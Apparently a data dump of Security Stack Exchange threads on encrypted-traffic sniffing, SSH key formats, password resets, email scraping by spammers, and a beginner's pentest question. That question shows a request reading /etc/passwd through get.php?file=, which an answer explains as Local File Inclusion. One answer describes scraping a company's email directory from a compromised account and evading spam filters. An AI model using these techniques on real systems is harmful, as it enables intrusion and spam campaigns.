<p>That said, if weak encryption is used, data may be at risk. Furthermore, some traffic may not actually be encrypted. For example, DNS traffic may not actually be routed over your VPN connection. This could at least disclose the domain names of the sites you are browsing to.</p>
","1"
"268805","268805","Can someone who is eavesdropping signals from Ethernet cable, gather sensitive information","<p>Supposing I have connected my laptop to the ethernet cable and all the traffic in the ethernet cable is encrypted (let's say VPN, HTTPS, etc.). Can someone who is eavesdropping the traffic with physical access to the Ethernet cable (via an Ethernet keylogger or maybe inductively, etc), decrypt the traffic and gather sensitive information?</p>
","0","3","268810","<p>In order to do so, they would have to breach all the encryption methods, starting from the Layer 2 encryption (ethernet, or vpn if it runs on layer 2) and the rest. It is possible but becoming challenging with each step. As an example, if vpn is vulnerable or if the ssl website is vulnerable to attack such as <a href=""https://www.keyfactor.com/blog/what-are-ssl-stripping-attacks/"" rel=""nofollow noreferrer""> ssl stripping </a> or <a href=""https://www.techtarget.com/searchsecurity/definition/Heartbleed"" rel=""nofollow noreferrer""> heartbleed,</a> then it makes it possible. If you are using openvpn, here are some of the openvpn protocol <a href=""https://www.cvedetails.com/vulnerability-list/vendor_id-3278/Openvpn.html"" rel=""nofollow noreferrer""> vulnerabilities</a> , hence that is the most popular vpn protocol. But again, every layer of encryption is a challenge.</p>
","1"
"268805","268805","Can someone who is eavesdropping signals from Ethernet cable, gather sensitive information","<p>Supposing I have connected my laptop to the ethernet cable and all the traffic in the ethernet cable is encrypted (let's say VPN, HTTPS, etc.). Can someone who is eavesdropping the traffic with physical access to the Ethernet cable (via an Ethernet keylogger or maybe inductively, etc), decrypt the traffic and gather sensitive information?</p>
","0","3","268811","<p>The short answer; in theory yes, in practice no.</p>
<p>There's two principles you should know before I explain whats happening;</p>
<p><strong>Asymmetric algorithms</strong>; public and private keys, used for the encryption and transfer of symmetric keys. <a href=""https://cryptography.io/en/latest/hazmat/primitives/asymmetric/index.html"" rel=""nofollow noreferrer"">https://cryptography.io/en/latest/hazmat/primitives/asymmetric/index.html</a></p>
<p>and <strong>Symmetric algorithms</strong>; typically a faster encryption however still very strong. <a href=""https://cryptography.io/en/latest/hazmat/primitives/symmetric-encryption/"" rel=""nofollow noreferrer"">https://cryptography.io/en/latest/hazmat/primitives/symmetric-encryption/</a></p>
<p>I'll address the two examples you question the encryption. I have access to your ethernet cable, and all the data traversing it.</p>
<p><strong>You're on a VPN</strong></p>
<p>A VPN connects with a asymetrical key transfer; client gives server (public) encryption key, client keeps (private) decryption key secret, server gives client it's encryption key and keeps the server's decryption secret. They then transmit a key for a &quot;faster&quot; encryption method through that &quot;slower&quot; encryption method.</p>
<p>You then encrypt all the network data to the VPN server with that faster encryption method. Local network header information (metadata) is not encrypted, but the VPN connection has it's own network header information in the packets data. Where it's a packet inside a packet, all that new network traffic is encrypted.</p>
<p>Through metadata I don't know your destination other than that VPN server, you can connect to any website or system through that network and I won't know. I just see you talking to a VPN server.</p>
<p>In theory, with all the time and resources in the universe, I can eventually decrypt the data. In practice however it's probably in the time frame of 8000+ years. I could target the faster encryption method where all the data is, or I could try to target the assymetrical encryption and decrypt the conversation that transmitted the symmetrical keys. Still, in practice, either is significantly difficult right now to compromise.</p>
<p><strong>You're connecting to HTTPS</strong></p>
<p>It's actually very similar in situ, but only the the HTTP data is encrypted.</p>
<p>Your browser talks to the HTTPS server with assymetrical encryption, and then transmits a symmetrical key for (faster) encryption. This can also compress the data. Then both computers transmit using the symmetrical key encryption.</p>
<p>I can see what site you're going to (IP Address and DNS requests), and monitor your activity (throughput), but what is being discussed and transimitted is hidden through that faster encryption. So I can see you're going to naughtysite.com and that you've downloaded 800mb of data, but I don't know what video you've watched, nor can I see the video content itself.</p>
<p>Again, I can attempt to attack the asymmetric keys where I'd can get the symmetric key, or just attack the symmetric key encrypted data. Both of which would take a really long time to attack. And I believe, the symmetric key may change over time throughout the connection to the server, so I may have to attack multiple symmetric keys and not know where/when in the conversation that change has happened.</p>
<p><strong>Weak Encryption</strong></p>
<p>So all of that assumes you're using strong encryption algorithms. There are weak algorithms no longer used in practice, primarily because they are &quot;easy&quot; to decrypt, or they have major flaws that are easy to break. Which is why you want to make sure you're using a VPN or HTTPS with strong encryption algorithms, but again they typically aren't used in practice, just in study. (an example off the top of my head is WEP for wifi encryption)</p>
<p>But that doesn't mean the encryption algorithms we use don't have a flaw we don't know about today, and next week we might find that flaw, where that once strong encryption is now broken. So everything I've captured today, I might decrypt next month.</p>
<p><strong>Vulnerable Software</strong></p>
<p>The remaining part of the chain is the software used to encrypt the traffic and exchange those keys. If there is a vulnerability in that software where I can compel the software to release the key to me or change the key to something I want, then I can compromise the communication and decrypt or inject data.</p>
","1"
"268793","268793","Is it possible to retrieve the public-key from an encrypted or passphrase-protected ssh private-key?","<p>I have created an open-ssh keypair using <code>ssh-keygen</code> with the defaults, and encrypted the private key with a passphrase. I already know how to derive the public-key from the private-key using <code>ssh-keygen -y</code>, for which I will need to enter the passphrase protecting the private-key. But, is it possible to extract the public-key from this file without the passphrase?</p>
","0","3","268795","<p><em><strong>Clarification</strong></em>: <em>the answer is about extracting/producing a public key from a file that only contains an encrypted private key. Extracting a public key from a file that contains both the (encrypted) private key and the (plaintext) public key is covered in other answers.</em></p>
<p>--- <strong>Original answer</strong> ---<br />
No, it is not possible - given that we're not talking about breaking the encryption in any way, that is.</p>
<p>The purpose of encryption is to protect the private key so it is inaccessible and cannot be used to produce/decrypt/sign accordingly with the respective public key.</p>
","1"
"268793","268793","Is it possible to retrieve the public-key from an encrypted or passphrase-protected ssh private-key?","<p>I have created an open-ssh keypair using <code>ssh-keygen</code> with the defaults, and encrypted the private key with a passphrase. I already know how to derive the public-key from the private-key using <code>ssh-keygen -y</code>, for which I will need to enter the passphrase protecting the private-key. But, is it possible to extract the public-key from this file without the passphrase?</p>
","0","3","268824","<p>Depends on version.</p>
<p>In OpenSSH below 7.8, <code>ssh-keygen</code> by default generates an RSA key(pair) and writes it in (what OpenSSH now calls) 'old' format which is OpenSSL's 'traditional' aka 'legacy' format which is encrypted (if at all) using PEM-level encryption, and extracting any details including the public key requires decryption using the passphrase.</p>
<p>In 7.8 up, <code>ssh-keygen</code> by default writes in OpenSSH 'new' format, which contains the public key in unencrypted form even when the private key is encrypted. But you'll need to write your own code to do this; 'normal' <code>ssh-keygen -y</code> still needs the passphrase because it uses routines that read the whole keypair even when that isn't really needed.</p>
<p>Versions 6.5 up write 'new' format if you specify <code>-o</code> (which is unnecessary and ignored in 7.8 up), and also do so by default if you generate <code>ed25519</code> because there was (and still is) no OpenSSL 'traditional' format for that algorithm.</p>
<p>See the file <code>PROTOCOL.key</code> in any recent source distribution <a href=""https://github.com/openssh/openssh-portable/blob/master/PROTOCOL.key"" rel=""nofollow noreferrer"">or on github</a>, or code in several libraries that read this format, for example I find <a href=""https://github.com/mwiede/jsch/blob/master/src/main/java/com/jcraft/jsch/KeyPair.java#L1130"" rel=""nofollow noreferrer""><code>Jsch</code> in Java</a> to be easy to read and understand.</p>
<p>As Spyros says, private-key operations -- namely sign (used for SSH) or decrypt (not normally used in SSH, but could still be done by other software with an SSH key) -- (still) require decryption with the passphrase.</p>
","2"
"268793","268793","Is it possible to retrieve the public-key from an encrypted or passphrase-protected ssh private-key?","<p>I have created an open-ssh keypair using <code>ssh-keygen</code> with the defaults, and encrypted the private key with a passphrase. I already know how to derive the public-key from the private-key using <code>ssh-keygen -y</code>, for which I will need to enter the passphrase protecting the private-key. But, is it possible to extract the public-key from this file without the passphrase?</p>
","0","3","268843","<p>Apparently, this is possible:
<code>ssh-keygen -ef id_rsa</code> outputs the public-key without needing us to give the password protecting the private-key.</p>
<p>The public-key generated this way (-ef) matches the original generated public-key:</p>
<pre><code># Get the value of public-key using the 'y' flag:
ssh-keygen -yf id_rsa &gt; id_rsa--y.pub
cat id_rsa--y.pub | cut -d' ' -f 2 | tr -d '\n' &gt; id_rsa--y-value.pub

# Get the value of public-key using the 'e' flag:
sed -n 3,10p &lt;(ssh-keygen -ef id_rsa) | tr -d '\n' &gt; id_rsa--e-value.pub

diff id_rsa--y-value.pub id_rsa--e-value.pub
# diff returns nothing, indicating a perfect match
</code></pre>
","2"
"268759","268759","When resetting password after forgetting it, why is there a need to notify ""Password cannot be your previous password""?","<p>This is from the perspective of someone who had supposedly forgotten their password. We're doing this project wherein we &quot;secure&quot; an application that was given to us. We added this &quot;forget password&quot; feature that allows a user to change their password after providing answers to security questions. It was implemented in a way that follows most existing applications: if the given password happens to be the same as the current one, the user is notified &quot;Password can't be the same as your previous password&quot;.</p>
<p>Why can't an application just let me &quot;change&quot; it and proceed or just direct me to the login page? I know that the user can just go to the login page themselves, I just need to know the reason for having to notify us this information.</p>
","3","4","268765","<p>If the policy of the company or the site is to ensure that passwords are indeed changed regularly, and passwords are not allowed to be reused, then password-changing functions include a check to see if the new password is the same as the previous one.</p>
<p>As for &quot;why can't a password changing process simply switch over to a login process if the passwords are the same?&quot; then that's a UX and a program logic flow question that isn't about security (I, personally, would find that strange and confusing as a user).</p>
","0"
"268759","268759","When resetting password after forgetting it, why is there a need to notify ""Password cannot be your previous password""?","<p>This is from the perspective of someone who had supposedly forgotten their password. We're doing this project wherein we &quot;secure&quot; an application that was given to us. We added this &quot;forget password&quot; feature that allows a user to change their password after providing answers to security questions. It was implemented in a way that follows most existing applications: if the given password happens to be the same as the current one, the user is notified &quot;Password can't be the same as your previous password&quot;.</p>
<p>Why can't an application just let me &quot;change&quot; it and proceed or just direct me to the login page? I know that the user can just go to the login page themselves, I just need to know the reason for having to notify us this information.</p>
","3","4","268791","<blockquote>
<p>Why can't an application just let me &quot;change&quot; it and proceed [...]</p>
</blockquote>
<p>Two reasons come to my mind:</p>
<ul>
<li>because it can be a security requirement/policy; password changing is a common practice that tries to narrow the window of opportunity of a breach</li>
<li>in order to avoid cases where you've forgot your password, you haven't logged in in a while but your account is active; that means that someone else is using your account and, most probably, that person knows your current password. Which also means that you have to <em>change</em> the password in order to lock that other person out</li>
</ul>
","0"
"268759","268759","When resetting password after forgetting it, why is there a need to notify ""Password cannot be your previous password""?","<p>This is from the perspective of someone who had supposedly forgotten their password. We're doing this project wherein we &quot;secure&quot; an application that was given to us. We added this &quot;forget password&quot; feature that allows a user to change their password after providing answers to security questions. It was implemented in a way that follows most existing applications: if the given password happens to be the same as the current one, the user is notified &quot;Password can't be the same as your previous password&quot;.</p>
<p>Why can't an application just let me &quot;change&quot; it and proceed or just direct me to the login page? I know that the user can just go to the login page themselves, I just need to know the reason for having to notify us this information.</p>
","3","4","268792","<p>Passwords in some systems require to be changed regularly, due to possible database leaks, or more importantly, for <em>your own</em> security. You could have given away the same password you are using in another platform, not by your mistake, but by that system being compromised. Or someone could plant something similar to keylogger on your system to capture your used passwords.</p>
<p>You can get the most security by changing your password regularly on a platform. You don't end up using the same password on different platforms, hence if one is compromised then all of them can be. Also you giving less chance and time for attackers to figure out your password out and use them, from a leaked database. You can check leaked passwords from an application like <a href=""https://haveibeenpwned.com/Passwords"" rel=""nofollow noreferrer"">password pwned checker</a>.</p>
<p>For your question, it is about the architecture of the system, probably when you go and start reset password steps, your current password becomes an <em>old</em> password in the system. And the system will probably not allow you to use last <em>n</em> number of passwords due to reasons I told you above. So the application's database looks like this:</p>
<pre><code>password
oldpassword1
oldpassword2
oldpassword3
</code></pre>
<p>When you start restart password process, your <code>password</code> becomes,  <code>oldpassword1</code> and <code>password3</code> pops from the list. So your <code>password</code> is waiting to be set. As I said, this is all about software design of the system. The programmer could design it many ways, how they see fit secure.</p>
","0"
"268759","268759","When resetting password after forgetting it, why is there a need to notify ""Password cannot be your previous password""?","<p>This is from the perspective of someone who had supposedly forgotten their password. We're doing this project wherein we &quot;secure&quot; an application that was given to us. We added this &quot;forget password&quot; feature that allows a user to change their password after providing answers to security questions. It was implemented in a way that follows most existing applications: if the given password happens to be the same as the current one, the user is notified &quot;Password can't be the same as your previous password&quot;.</p>
<p>Why can't an application just let me &quot;change&quot; it and proceed or just direct me to the login page? I know that the user can just go to the login page themselves, I just need to know the reason for having to notify us this information.</p>
","3","4","268797","<p>I think you were given reasons why people do it but not why or whether it is necessary.</p>
<p>An example: I try to log in to site A and enter the password for site B several times. I can’t login so I do a password reset. Obviously as soon as a tap on “forgot password” I realise my mistake. As a user I would prefer in that order: Do nothing, my old password continues to work. 2. I set the password to the original value. 3. I’m forced to create and remember a new password. Either solution is safe, because nothing happened.</p>
<p>If someone resets the password because someone else might have learned it, then I’d expect the user to figure out that using the same password isn’t going to help. No reminder or refusal needed.</p>
<p>And then anyone could go to the website and press “forgot password”. As a user, I should be able to ignore this completely if the prankster doesn’t have access to my email or my messaging app. Under no circumstances should a prankster be able to make me change my password.</p>
<p>And a password reset message should assume that it might not have been the user causing it, so it should contain information. Like “if it wasnt you who tapped on “forgot password”then do this…”.</p>
","0"
"268743","268743","Is email scraping still a thing for spammers","<p>I've run a website for barely three months now and put my emails on there. I also run a catch-all address on this domain. Since my website is online, I haven't received a single spam email on the addresses provided on the website.</p>
<p>So I'm wondering if email scraping is still a thing. Spammers still need means to somehow get new, fresh email addresses.</p>
<p>How do they do it if not with scraping (as one tool from many)? Yes, I know spammers can buy email lists or similar, but that's not the point. These email addresses that are inside those lists must have originated somewhere, and spammers need to find new email addresses, that's where this question is aiming at.</p>
","28","8","268746","<p>It is possible for automated scripts to find a site almost immediately. But it can also take a while.</p>
<p>As someone who ran honeypots for a long time, it was frustrating how long it could take to &quot;get noticed&quot;. But once my site was &quot;on the radar&quot;, my sites were hit constantly and emails scraped. And 3 months was not an unusual lead time.</p>
<p>As for other methods:</p>
<ul>
<li>it is possible to query email servers directly</li>
<li>spam scripts don't need a valid email, they can just try every name/combination they can think of. Any email address that doesn't return an error goes on lists</li>
</ul>
","12"
"268743","268743","Is email scraping still a thing for spammers","<p>I've run a website for barely three months now and put my emails on there. I also run a catch-all address on this domain. Since my website is online, I haven't received a single spam email on the addresses provided on the website.</p>
<p>So I'm wondering if email scraping is still a thing. Spammers still need means to somehow get new, fresh email addresses.</p>
<p>How do they do it if not with scraping (as one tool from many)? Yes, I know spammers can buy email lists or similar, but that's not the point. These email addresses that are inside those lists must have originated somewhere, and spammers need to find new email addresses, that's where this question is aiming at.</p>
","28","8","268747","<p>Scraping is still a technique spammers use to harvest victim addresses, but as there are far more methods today than there were a dozen+ years ago, scraping is no longer the primary mechanism to find spam victims. Data leaks (especially account dumps) are a good example of a more modern source of potential spam victims.</p>
<p>Additionally, spammers are now much more sophisticated in how they choose and then scrape websites. They used to discover pages to scrape the same way search engines did—by blindly following links. Nowadays, they can pump key phrases into search engines and filter the results before scraping. This means you have to wait to be indexed and then wait to be scraped. You shouldn't expect results quickly (if at all), though you might get lucky.</p>
<p>The Messaging, Malware, and Mobile Anti-Abuse Working group has put out a <a href=""https://www.m3aawg.org/sites/default/files/m3aawg-spamtrap-operations-bcp-2016-08.pdf"" rel=""noreferrer"">M³AAWG Best Current Practices For Building and Operating a Spamtrap<img src=""https://i.stack.imgur.com/gjCGQ.png"" alt=""PDF"" /></a> document that may further assist you, though as seeding techniques are industry secrets, you won't find anything on that topic there (just vague references to an ancient tool called <a href=""https://web.archive.org/web/20160821195248/http://www.monkeys.com/wpoison/"" rel=""noreferrer"">wpoison</a>, which wasn't really a trap-seeding technique).</p>
<p>See also:</p>
<ul>
<li><a href=""https://security.stackexchange.com/a/117452/42391"">Databases with spam, phishing email examples</a></li>
<li><a href=""https://security.stackexchange.com/q/248838/42391"">How can I get more spam for my honeypot?</a></li>
<li>Search the web for <a href=""https://duckduckgo.com/?q=seeding+%22spam%20trap%22"" rel=""noreferrer"">seeding a spam trap</a></li>
</ul>
","26"
"268743","268743","Is email scraping still a thing for spammers","<p>I've run a website for barely three months now and put my emails on there. I also run a catch-all address on this domain. Since my website is online, I haven't received a single spam email on the addresses provided on the website.</p>
<p>So I'm wondering if email scraping is still a thing. Spammers still need means to somehow get new, fresh email addresses.</p>
<p>How do they do it if not with scraping (as one tool from many)? Yes, I know spammers can buy email lists or similar, but that's not the point. These email addresses that are inside those lists must have originated somewhere, and spammers need to find new email addresses, that's where this question is aiming at.</p>
","28","8","268748","<p>Assuming we define &quot;spam&quot; as it has been traditionally, as unsolicited bulk email, and spammers as anyone who sends spam regardless of intention, then email scraping from regular websites is definitely a thing.  There's also scraping from Git commits (often for sending surveys or job offers), OpenPGP keys, mailing list archives, and pretty much anything else that can contain an email address.</p>
<p>I've also seen email addresses harvested from data breaches as well, and some spammers get them by simply buying data from parties who have it.  And, of course, there are companies who sign people up for mailing lists without their consent after a purchase.</p>
<p>All of these can take some time to happen, as schroeder said.  Three months isn't unusual in any way.</p>
","5"
"268743","268743","Is email scraping still a thing for spammers","<p>I've run a website for barely three months now and put my emails on there. I also run a catch-all address on this domain. Since my website is online, I haven't received a single spam email on the addresses provided on the website.</p>
<p>So I'm wondering if email scraping is still a thing. Spammers still need means to somehow get new, fresh email addresses.</p>
<p>How do they do it if not with scraping (as one tool from many)? Yes, I know spammers can buy email lists or similar, but that's not the point. These email addresses that are inside those lists must have originated somewhere, and spammers need to find new email addresses, that's where this question is aiming at.</p>
","28","8","268768","<p>I work for an email delivery service and we use our own subdomain to fill in missing message-id headers.The subdomain is only ever used for message-id headers not for email mailboxes or source addresses.</p>
<p>That subdomain gets lots of spam addressed to message-ids, so yes scraping is still a thing, and it's done badly.  for MX we list a selection of spam-trap providers and one system that picks up a sample of the traffic.</p>
","1"
"268743","268743","Is email scraping still a thing for spammers","<p>I've run a website for barely three months now and put my emails on there. I also run a catch-all address on this domain. Since my website is online, I haven't received a single spam email on the addresses provided on the website.</p>
<p>So I'm wondering if email scraping is still a thing. Spammers still need means to somehow get new, fresh email addresses.</p>
<p>How do they do it if not with scraping (as one tool from many)? Yes, I know spammers can buy email lists or similar, but that's not the point. These email addresses that are inside those lists must have originated somewhere, and spammers need to find new email addresses, that's where this question is aiming at.</p>
","28","8","268786","<p>One area where scraping is highly prevalent is in targeted phishing campaigns, where the scammers retrieve not just email addresses, but also other information from corporate websites, and then create an email campaign to target individuals at a lower tier in the corporate hierarchy with fake emails from higher ups, attempting to trick them into revealing credentials, approve transactions, or other criminal activities.</p>
<p>These are not huge mass-mailings to random addresses, but much smaller campaigns targeting a small number of employees at a specific company. Whether this meets the definition of spam is a matter of opinion, but it's definitely unsolicited email sent to random people for nefarious purposes.</p>
<p>A low-level employee might get an email from a corporate officer asking them to help by buying gift cards. A member of the accounting team might get a request to approve a bank transfer. The scammer always explains that they are in a meeting or traveling, so they can't talk directly, and often they want to move the conversation to SMS.</p>
<p>These scams are extremely profitable and effective.</p>
","4"
"268743","268743","Is email scraping still a thing for spammers","<p>I've run a website for barely three months now and put my emails on there. I also run a catch-all address on this domain. Since my website is online, I haven't received a single spam email on the addresses provided on the website.</p>
<p>So I'm wondering if email scraping is still a thing. Spammers still need means to somehow get new, fresh email addresses.</p>
<p>How do they do it if not with scraping (as one tool from many)? Yes, I know spammers can buy email lists or similar, but that's not the point. These email addresses that are inside those lists must have originated somewhere, and spammers need to find new email addresses, that's where this question is aiming at.</p>
","28","8","268789","<p><em><strong>Scrapers, How and Modern Situation</strong></em></p>
<p>As oppose to other answers, scraping is a very old method, and modern scrapers will have rules for scraping. There are many tools in existence like <a href=""https://web.archive.org/web/20160821195248/http://www.monkeys.com/wpoison/"" rel=""nofollow noreferrer""> wpoison</a> and due to this reason most scrapers will have limits on the number of redirects for current links (as this depends on how much the poisoner can fake the reality of the new page, for example if it is the same subdomain <code>fake1.domain.com</code> and <code>fake2.domain.com</code>, it is a flag for the scraper.) Also some scrapers will only scrape emails from white-listed websites, such as <strong>facebook.com</strong> if it were to list any emails, or more.</p>
<p>More scrapers will use pathing technique which for a specific domain they will scrape predefined paths, such <strong>facebook.com/mails/QUERYHERE</strong> and not the whole domain itself.</p>
<p>Also, as a spammer, I would come and manually look at the list of emails I scraped being real or not. For example, I have a scraper tool I would be using for months, and after a day, or few days, depends on my will really, I would go and look up on the <code>mailList.txt</code> that I scraped so far, to tell if the mails are real. If the poisoner creates mails such as, <code>randomaxy@abdef.com</code>or <code>asd@asd.com</code> I would manually see it, check from which links I obtained them from, and put rules on that link. So a fake list would look like this</p>
<pre><code>asdasdafjak@skadflaklfjsak.sadka
FAKENAAME@kfalskalf.org
fakeorg@fakeorg.org
Shelly@gmail.com
Shelly2@gmail.com
Shelly3@gmail.com
</code></pre>
<p>And if I get these from a <code>somePoisonerDomain.com</code> I would black list that link from my mail scraper. Manually.</p>
<p><em><strong>Next, Scraping Data From Inside Businesses</strong></em></p>
<p>If a malicious hacker wanted to scrape mails from a specific business, the hacker could only need access to one email from that domain, such as <code>person@targetdomain.com</code> with login credentials. Then after logging in, it can scrape through available e-mails to send within that business domain, as most business offer this solution. Example picture</p>
<p><a href=""https://i.stack.imgur.com/4lcBn.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/4lcBn.png"" alt=""enter image description here"" /></a></p>
<p>My school domain can be seen there, but it is not an issue. And it uses gmail as its mail service. As you see if I write <code>a</code> it will give me all emails containing that. So a hacker can automate writing, starting from <code>a, aa, ab</code> and scrape all of the emails in existence. A hacker only needs one email from inside, so if you are a business owner, make sure to remind your employees about this, so that they keep strong passwords and do not surf any malicious links!</p>
<p>Indeed I coded <a href=""https://github.com/noname29/outlookScrape"" rel=""nofollow noreferrer"">a business email scraper for outlook</a>. I used selenium, you could use any automated browser tool. Normally this is supposed to be confidential information, but I share this for education purposes. Same could be done on google's gmail, or any other platform that supports <strong>prospective email listing</strong> upon key entry.</p>
<p><em><strong>Going Back To SpamTrappers</strong></em></p>
<p>Billionaire companies such as Google for sure have spam trappers working in the background, they either implanted them on their services or most obviously, they have filtering method on their mail services like <strong>gmail</strong>. So if a spammer was to send the same exact mails to many emails from many different emails, the email content would get marked as a spam. If that makes sense, on gmail, a single email is allowed to send around 500 mails a day, and you'd want to send 10 thousand mails, you either wait 20 days, or you use 20 different accounts to send 500 mails from each. Second option is more suspicious, and your mail content will go to spam. As a spammer, what you would want to do is change the contents that are being sent from each mail, by either adding extra text, images or html.</p>
<p>Also, the mail addresses that the mails are being sent from could be not trustworhy, as in not white-listed yet. If it is a new email the google has confronted, they will put it to suspicious list. If the email has been used for many many years, and has many subscriptions from youtube, quora, twitter etc, google will know it is being used by a real person and <strong>will most and most</strong> likely not set the mails sent by that address to spam, unless receivers mark you as spam or your content is bad content. So the emails should be clean too. Otherwise they will end up in spam folder where most users avoid looking.</p>
<p><em><strong>Next is database leaks, SQL injections</strong></em></p>
<p>As a business owner, your emails are in your database, and if your database are leaked, you would be giving away all emails to hackers for spamming as well. And these are the most important emails, because these literally what make up your business, who are <em>all your clients</em>. You wouldn't be keeping fake emails in your database like those poisoner are generating on the page, even if you did, that'd be to some limit. (Which it could be an idea I thought about.) Make sure to keep your database as safe as possible, do not let any SQL injections or some sort, and do not give away your emails. The spammers in modern days, <strong>which I mean in 2023</strong>, mostly will target specific businesses <strong>instead of</strong> using scrapers. They either use the technique I told you above, or they try to get data from servers or databases. So yes, <strong>email scraping is still a thing depending on its efficiency</strong>, and efficiency will most likely come from <em><strong>having specific targets</strong></em> due to many filters, and spamholes.</p>
<p>Make sure your servers are protected. Rest is Google's or Microsoft's job to decide if an incoming mail is spam or not. Or whatever mail service you are using, make sure they have good spam filters too. You will most likely be protected. And my program above hopefully tells you so many things, I could easily get mails like that, so get everyone in your company protected.</p>
","3"
"268743","268743","Is email scraping still a thing for spammers","<p>I've run a website for barely three months now and put my emails on there. I also run a catch-all address on this domain. Since my website is online, I haven't received a single spam email on the addresses provided on the website.</p>
<p>So I'm wondering if email scraping is still a thing. Spammers still need means to somehow get new, fresh email addresses.</p>
<p>How do they do it if not with scraping (as one tool from many)? Yes, I know spammers can buy email lists or similar, but that's not the point. These email addresses that are inside those lists must have originated somewhere, and spammers need to find new email addresses, that's where this question is aiming at.</p>
","28","8","268806","<p>Scraping did not fell out of favour entirely. Combined efforts just made it so <strong>spammers now need to succeed in additional steps besides just scraping public data</strong>. Collecting addresses and sending undirected garbage right away is simply no longer the most efficient way of advancing criminal plans.</p>
<p>First, addresses which were only published to gather information on spam campaigns (honey pots) do hinder their effectiveness drastically, so spammers try to filter and cross-check with other sources. Few humans visiting my website sees the interesting css classes attached to the tag where one of my mailboxes is published, but scraping tools evidently do and assume its a trap.</p>
<p>Then, because of the massive centralization it has in general become less worthwhile to send basically the same message to a large number of recipients - Google can recognize <em>almost-copies</em> quite well these days. So what spammers will do is wait until the address they scraped somewhere (billing@example.com) is matched in some other database. That could be a template of how a message sent by that domain would look like (e.g. the greeting and signature from support@example.com) and only then they generate custom messages to the other mailboxes in that domain. With this extra step, the &quot;does this look similar?&quot; approaches of detecting mass spam become less effective, because the message <em>does</em> look similar - similar to known-good traffic exchanged with that domain.</p>
<p>Other sources include (automatically) browsing through compromised databases and email accounts (or backups thereof). Wordpress and Exchange components are so widely deployed and frequently affected by total-compromise security problems, specialised software specifically to search through unauthorized access to these exist and produces much higher quality datasets than just browsing public websites. In a way that is just a more advanced version of older scraping approaches.</p>
","0"
"268743","268743","Is email scraping still a thing for spammers","<p>I've run a website for barely three months now and put my emails on there. I also run a catch-all address on this domain. Since my website is online, I haven't received a single spam email on the addresses provided on the website.</p>
<p>So I'm wondering if email scraping is still a thing. Spammers still need means to somehow get new, fresh email addresses.</p>
<p>How do they do it if not with scraping (as one tool from many)? Yes, I know spammers can buy email lists or similar, but that's not the point. These email addresses that are inside those lists must have originated somewhere, and spammers need to find new email addresses, that's where this question is aiming at.</p>
","28","8","268818","<p>I have been running a website with a plain <code>mailto:</code> e-mail contact link on the footer of every page for more than 7 years. It was included in Alexa Top1M, it's been indexed by major news outlets and it has hundreds of thousand of unique views. It gets a ton of attacks. It gets a ton of abuse. It gets a ton of form spam. What it doesn't get is e-mail spam to that domain that's listed on every page. In 2022 I have received about 40 unsolicited messages, and most of them were not even directed to me. Over a half were actually mailer daemon notifications when somebody tried to spoof my e-mail address, or receipts from contact forms where they spammed somebody else using my e-mail address.</p>
<p>So based on personal experience I can say that <strong>no, e-mail scraping is no longer a thing for spammers</strong>.</p>
<p>In general, web changes fast. Most of the attack vectors you'd read about 10 years ago are all but irrelevant nowadays. With the barrier of entry to cybercrime being made extremely low, if a new attack method is discovered, it quickly gets saturated by a lot of unsophisticated threat actors and rendered ineffective in a short period of time.</p>
","1"
"268607","268607","Understanding of HTTP GET request","<p>I am initiating and doing a basic penetration testing course and have come across one doubt.</p>
<p>For example in this URL:
<code>http://webapp.thm/index.php=?page=1</code></p>
<p>I get that I am requesting the <code>index.php</code> file in the server and I am specifying that I want to view page 1 as a value of the parameter.</p>
<p>But in this other URL: <code>http://webapp.thm/get.php?file=/etc/passwd</code></p>
<p>I am having trouble understanding this request because I am requesting <code>get.php</code> (which is already a file) and the parameter <code>file</code> is accesing a different file <code>/etc/passwd</code>.</p>
<p>My question is what does the <code>get.php</code> file contain in this case or is it a function? because it seems to me that it is function retrieving the <code>/etc/passwd</code>, but I know that it is not a function, so I am kind of confused about what the <code>get.php</code> means.</p>
<p>got a picture describing it from the course:</p>
<p><a href=""https://i.stack.imgur.com/wyPJ4.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/wyPJ4.png"" alt=""enter image description here"" /></a></p>
","4","7","268608","<blockquote>
<p>I am requesting get.php(which is already a file)</p>
</blockquote>
<p>HTTP is not about requesting files, but about requesting resources specified by the URL. These resources might be a static file returned by the web server but they might also be created dynamically based on the URL.</p>
<p>In this specific case you are not requesting the contents of the file get.php to be returned, but you request the program get.php to be executed. And <code>file=/etc/passwd</code> is processed by this program - how exactly depends on the program. Based on your description the program will likely take it as a parameter <code>file</code> with the value <code>/etc/passwd</code>, open the file and return it as response. If this succeeds, this is known as a Local File Inclusion vulnerability (LFI).</p>
","45"
"268607","268607","Understanding of HTTP GET request","<p>I am initiating and doing a basic penetration testing course and have come across one doubt.</p>
<p>For example in this URL:
<code>http://webapp.thm/index.php=?page=1</code></p>
<p>I get that I am requesting the <code>index.php</code> file in the server and I am specifying that I want to view page 1 as a value of the parameter.</p>
<p>But in this other URL: <code>http://webapp.thm/get.php?file=/etc/passwd</code></p>
<p>I am having trouble understanding this request because I am requesting <code>get.php</code> (which is already a file) and the parameter <code>file</code> is accesing a different file <code>/etc/passwd</code>.</p>
<p>My question is what does the <code>get.php</code> file contain in this case or is it a function? because it seems to me that it is function retrieving the <code>/etc/passwd</code>, but I know that it is not a function, so I am kind of confused about what the <code>get.php</code> means.</p>
<p>got a picture describing it from the course:</p>
<p><a href=""https://i.stack.imgur.com/wyPJ4.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/wyPJ4.png"" alt=""enter image description here"" /></a></p>
","4","7","268613","<p>Without knowing the code of <code>get.php</code> it is impossible to answer what it really does. May be it will interpret the parameter as a path and will read the content of the given file and return it. Or may be it will download this file. Or may be <code>get.php</code> has content like following</p>
<pre><code>&lt;?php echo &quot;Hello World!&quot;; ?&gt;
</code></pre>
<p>and will ignore any parameters and thus is absolutely harmless.</p>
<p>Show us the contents of <code>get.php</code>. Then we can tell what can be the result of sending request to <code>get.php</code>.</p>
","17"
"268607","268607","Understanding of HTTP GET request","<p>I am initiating and doing a basic penetration testing course and have come across one doubt.</p>
<p>For example in this URL:
<code>http://webapp.thm/index.php=?page=1</code></p>
<p>I get that I am requesting the <code>index.php</code> file in the server and I am specifying that I want to view page 1 as a value of the parameter.</p>
<p>But in this other URL: <code>http://webapp.thm/get.php?file=/etc/passwd</code></p>
<p>I am having trouble understanding this request because I am requesting <code>get.php</code> (which is already a file) and the parameter <code>file</code> is accesing a different file <code>/etc/passwd</code>.</p>
